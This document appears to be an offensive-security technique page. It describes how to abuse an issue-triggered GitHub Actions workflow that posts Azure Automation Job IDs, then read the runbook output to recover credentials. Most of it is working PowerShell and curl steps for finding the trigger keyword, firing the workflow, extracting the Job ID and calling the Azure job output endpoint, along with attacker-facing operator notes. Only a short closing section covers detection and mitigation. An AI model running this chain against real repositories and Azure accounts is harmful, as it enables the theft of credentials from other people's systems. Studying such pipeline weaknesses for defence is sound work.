## Overview

Some GitHub repositories use issue events as triggers for GitHub Actions workflows — when an issue is created with a specific keyword in the title or body, the workflow fires. This pattern is common in internal automation where the issue acts as a lightweight interface for triggering backend operations, avoiding the need for direct write access to the repository's Actions configuration.

The second attack surface is the Job ID disclosure: if the workflow submits a job to Azure Automation and a bot posts the resulting Job ID in an automatic comment on the issue, any identity with access to the repository comments can extract that Job ID — and with an ARM token that has `jobs/output/read`, read the full runbook output without having triggered the job through Azure directly.

## Preconditions

| Requirement | Detail |
|---|---|
| Issue creation access on the repository | Read access to a public repo is sufficient; for private repos, any collaborator-level access |
| Workflow trigger keyword | The keyword that activates the workflow — discoverable through workflow YAML or bot error messages |
| Bot comment with Job ID | The workflow must post execution identifiers back to the issue |
| ARM token with `jobs/output/read` | To read the Automation Account job output using the extracted Job ID |

## Discovering the Trigger Mechanism

Inspect the repository's workflow definitions:

```bash
# List workflows via GitHub API
curl -H "Authorization: Bearer <GITHUB_TOKEN>" \
     https://api.github.com/repos/<OWNER>/<REPO>/actions/workflows

# Read the YAML of a specific workflow
curl -H "Authorization: Bearer <GITHUB_TOKEN>" \
     https://api.github.com/repos/<OWNER>/<REPO>/contents/.github/workflows/<WORKFLOW.yml> \
     | jq -r '.content' | base64 -d
```

In the workflow YAML, look for `on: issues:` blocks and `if: contains(...)` conditions that gate execution on keyword presence.

If the workflow definition is not directly readable, create a test issue without the keyword and observe the bot's error response — error messages often reveal the expected input format or the required keyword.

## Firing the Workflow via Issue

```powershell
$headers = @{
    Authorization  = "Bearer <GITHUB_TOKEN>"
    "Content-Type" = "application/json"
}
$body = @{
    title = "Automation request"
    body  = "<TRIGGER_KEYWORD>"   # the keyword that activates the workflow
} | ConvertTo-Json

$issue = Invoke-RestMethod -Method POST -Headers $headers -Body $body `
    -Uri "https://api.github.com/repos/<OWNER>/<REPO>/issues"

$issueNumber = $issue.number
Write-Host "Issue created: #$issueNumber"
```

## Extracting the Job ID from Bot Comment

After the workflow fires, a bot posts a comment with the execution identifier:

```powershell
Start-Sleep -Seconds 30   # wait for workflow to run and bot to comment

$comments = Invoke-RestMethod -Method GET -Headers $headers `
    -Uri "https://api.github.com/repos/<OWNER>/<REPO>/issues/$issueNumber/comments"

# Extract UUID-format Job ID from the comment body
$jobId = [regex]::Match($comments[0].body, '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}').Value
Write-Host "Job ID: $jobId"
```

## Reading the Automation Job Output

With the extracted Job ID and an ARM token:

```powershell
$basePath = "/subscriptions/<SUB_ID>/resourceGroups/<RESOURCE_GROUP>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION_ACCOUNT>"
$uri      = "https://management.azure.com$basePath/jobs/$jobId/output?api-version=2023-11-01"

$output = Invoke-RestMethod -Method GET -Uri $uri `
    -Headers @{ Authorization = "Bearer $ARM" }

Write-Host $output
```

See **Automation Account — Job Output Credential Leak** for the full job output read technique.

## Attack Chain Summary

```
Identify repo with issue-triggered workflow
     ↓
Discover trigger keyword  →  from YAML, README, or bot error response
     ↓
Create issue with keyword →  GitHub API or web UI
     ↓
Wait for bot comment      →  bot posts Job ID from Azure Automation execution
     ↓
Extract Job ID            →  regex on comment body
     ↓
ARM jobs/output/read      →  retrieve full runbook output
     ↓
Extract credentials       →  plaintext data written by the runbook to stdout
```

## Operator Notes

- This technique does not require triggering the job through Azure — the job is triggered by the CI/CD pipeline itself. The attacker only needs to create an issue and read a comment.
- The Job ID is a standard UUID format — extract it from the comment with a simple regex pattern rather than relying on specific comment structure.
- The bot comment may take seconds to minutes to appear depending on workflow and runbook execution time. Poll the comments endpoint rather than using a fixed delay.
- Multiple job submissions can generate multiple Job IDs. If the first run produces no useful output, historical runs may still be within the 30-day Automation Account retention window.
- This technique is a pipeline abuse primitive — the attacker leverages the victim's own automation infrastructure to generate and expose credential material.

## Detection / Friction Points

- GitHub Actions audit log records workflow triggers, including the actor who created the triggering issue — visible to repository administrators.
- The bot comment containing the Job ID is visible to all repository participants — any observer could notice and investigate unusual issue patterns.
- ARM Activity Log records the `Get job output` read with the ARM identity used — this is the detectable step on the Azure side.
- Mitigation: do not post job execution identifiers in public-facing channels; validate that issue authors are authorized before triggering automation; restrict `jobs/output/read` to required identities only.
